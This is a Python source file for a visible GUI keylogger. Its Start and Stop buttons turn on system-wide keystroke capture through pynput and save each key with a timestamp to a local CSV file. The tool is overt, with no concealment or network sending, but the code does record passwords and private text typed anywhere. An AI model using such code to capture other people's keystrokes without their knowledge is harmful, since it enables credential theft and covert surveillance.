import os
import csv
import datetime
import threading
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

# Global variables
log_data = []
logging_enabled = False

def on_press(key):
    global log_data, logging_enabled
    if logging_enabled:
        try:
            log_data.append((datetime.datetime.now(), key.char))
        except AttributeError:
            log_data.append((datetime.datetime.now(), str(key)))

def start_logging():
    global logging_enabled
    logging_enabled = True

def stop_logging():
    global logging_enabled
    logging_enabled = False

def save_log():
    global log_data
    file_path = "key_log.csv"
    with open(file_path, "w", newline="") as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["Timestamp", "Key"])
        writer.writerows(log_data)
    log_data = []
    messagebox.showinfo("Log Saved", "Key log saved successfully.")

def main():
    def on_start():
        start_button.config(state=tk.DISABLED)
        stop_button.config(state=tk.NORMAL)
        start_logging()

    def on_stop():
        stop_button.config(state=tk.DISABLED)
        start_button.config(state=tk.NORMAL)
        stop_logging()
        save_log()

    root = tk.Tk()
    root.title("Keylogger")

    start_button = tk.Button(root, text="Start Logging", command=on_start)
    start_button.pack(pady=10)

    stop_button = tk.Button(root, text="Stop Logging", command=on_stop, state=tk.DISABLED)
    stop_button.pack(pady=10)

    # Start keyboard event listener
    with keyboard.Listener(on_press=on_press) as listener:
        root.mainloop()

if __name__ == "__main__":
    main()
